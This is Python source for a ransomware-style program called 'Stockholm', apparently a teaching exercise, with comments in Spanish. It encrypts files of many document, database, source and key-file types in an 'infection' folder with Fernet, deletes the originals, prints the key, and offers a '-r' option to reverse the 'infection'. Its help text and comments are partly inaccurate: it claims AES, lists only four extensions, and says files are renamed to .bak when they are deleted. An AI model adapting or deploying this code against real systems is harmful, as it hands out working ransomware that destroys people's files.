import os 
import argparse
import cryptography
from cryptography.fernet import Fernet

# Definir extensiones de archivos permitidos
extensions = ('.txt', '.pdf', '.doc', '.docx','.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
               '.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
               '.class', '.cmd', '.cpp', '.crt', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djvu',
               '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml', '.fla', '.flv',
               '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js',
               '.jsp', '.lay', '.lay6', '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml', '.mov',
               '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt',
               '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl',
               '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1',
               '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh', '.sldm', '.sldx', '.slk', '.sln', '.snt',
               '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std', '.sti', '.suo', '.svg', '.swf', '.sxc', '.sxd', '.sxi',
               '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd',
               '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.xlc',
               '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.zip', 'csr', 'p12')

# Definir argumentos 
parser = argparse.ArgumentParser()
parser.add_argument("-v","--version", help="Muestra la version del programa", action="store_true")
parser.add_argument("-i","--info", help="Mostrar información del programa", action="store_true")
parser.add_argument("-r","--reverse", help="Revertir la infeccion usando la clave especificada")
parser.add_argument("-s","--silent", help="No mostrar el progreso al cifrar archivos", action="store_true")

# Obtener argumentos 
args = parser.parse_args()

# Definir variables 
home = os.getcwd()
infect_dir = home + "/infection"

# Verificar que el directorio exista
try:
    os.listdir(infect_dir)
except FileNotFoundError:
    print("La ruta infection no existe.")
    exit()

# Mostrar información del programa 
if args.info:
    print("Stockholm es un programa de cifrado de archivos que utiliza el algoritmo AES para cifrar y descifrar archivos. Los archivos con las siguientes extensiones pueden ser cifrados: .txt, .pdf, .doc, .docx. Para cifrar archivos, ejecute el programa sin ningún argumento. Para revertir la infección, utilice el argumento -r seguido de la clave de cifrado que se utilizó para cifrar los archivos.")

# Mostrar versión del programa
elif args.version:
    print("Stockholm 1.0")

# Revertir infección  
elif args.reverse:
    if not args.reverse:
        print("Debe ingresar una clave para revertir la infección.")
    else:
        f = Fernet(args.reverse.encode()) 
        for file in os.listdir(infect_dir):
            base_name, ext = os.path.splitext(file)
            if os.path.isdir(file):
                print("Skipping...")
            elif not ext == ".ft":
                print("Skipping...")
            elif file.startswith(".DS_Store"):
                print("Skipping...")
            else:             
                with open(os.path.join(infect_dir, file), "rb") as infected_file:
                    try:
                        decrypted_file = f.decrypt(infected_file.read())
                        with open(os.path.join(infect_dir, base_name), "wb") as normal_file:
                            normal_file.write(decrypted_file)
                        os.remove(os.path.join(infect_dir, file))   
                        print(f"Infeccion revertida para archivo '{base_name}'")
                    except cryptography.fernet.InvalidToken:
                        print(f"Error: clave invalida o archivo '{file}' corrupto") 
            

# Cifrar archivos      
else:
    # Generar clave de cifrado
    key = Fernet.generate_key()  
    
    f = Fernet(key) 
    for file in os.listdir(infect_dir):
        base_name, ext = os.path.splitext(file)
        # Comprobar si el archivo tiene extension en la lista y no termina en .ft 
        if os.path.isdir(file):
            print("Skipping...")
        elif ext not in extensions or ext == ".ft":
            print("Skipping...")
        elif file.startswith(".DS_Store"):
            print("Skipping...")
        else:
            with open(os.path.join(infect_dir, file), "rb") as normal_file:
                encrypted_file = f.encrypt(normal_file.read())
            with open(os.path.join(infect_dir, file+".ft"), "wb") as infected_file:
                 infected_file.write(encrypted_file)     
            # Renombrar archivo normal a .bak
            os.remove(infect_dir+"/"+file)  
            
            # Mostrar progreso si no se especifico -s 
            if not args.silent:
                print(f"Archivo '{file}' cifrado")        
              
    # Mostrar resumen                
    if not args.silent: 
        print(f"{len(os.listdir(infect_dir))-1} archivos cifrados")
        print(f"Clave: {key.decode()}")